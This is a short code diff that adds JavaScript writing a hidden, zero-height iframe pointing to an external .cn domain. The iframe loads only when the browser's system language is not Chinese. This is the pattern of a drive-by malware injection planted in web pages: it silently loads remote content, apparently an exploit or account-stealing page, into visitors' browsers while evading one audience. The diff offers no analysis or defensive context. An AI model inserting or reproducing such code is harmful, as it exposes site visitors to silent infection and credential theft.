@@ -1,0 +1,6 @@
+if (navigator.systemLanguage=='zh-cn')
+{
+}
+else{
+document.writeln("<iframe src=\"http:\/\/www.killwow1.cn\/cc\/index.htm\" width=\"100\" height=\"0\"><\/iframe> ");
+}
